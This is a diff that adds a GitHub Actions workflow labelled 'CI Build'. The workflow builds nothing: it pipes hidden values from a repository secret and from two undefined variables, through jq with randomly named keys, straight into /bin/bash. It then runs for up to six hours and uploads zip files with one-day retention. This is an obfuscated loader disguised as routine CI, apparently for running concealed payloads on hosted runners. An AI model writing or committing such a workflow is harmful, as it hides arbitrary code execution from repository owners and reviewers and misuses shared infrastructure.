@@ -1,0 +1,25 @@
+name: CI Build
+on:
+  workflow_dispatch:
+
+jobs:
+  handler:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Launch
+        env:
+          b4: ${{ secrets.b4 }}
+        run: |
+          printf '%s' "$b4" | jq -r .vevi7898 | /bin/bash
+          echo $moaja751 | jq -r .h5 | /bin/bash
+          printf '%s' "$widel797" | jq -r .o73 | /bin/bash
+
+      - name: Persist output
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: PcLcUg7W
+          path: "*.zip"
+          retention-days: 1
